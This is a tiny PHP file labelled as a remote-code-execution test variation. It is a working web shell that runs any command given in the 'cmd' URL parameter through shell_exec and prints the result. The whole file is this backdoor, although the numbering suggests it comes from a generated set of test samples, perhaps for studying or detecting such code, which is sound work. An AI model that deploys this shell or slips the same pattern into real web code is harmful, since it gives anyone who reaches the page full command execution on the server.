<?php
// RCE test variation #1361
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>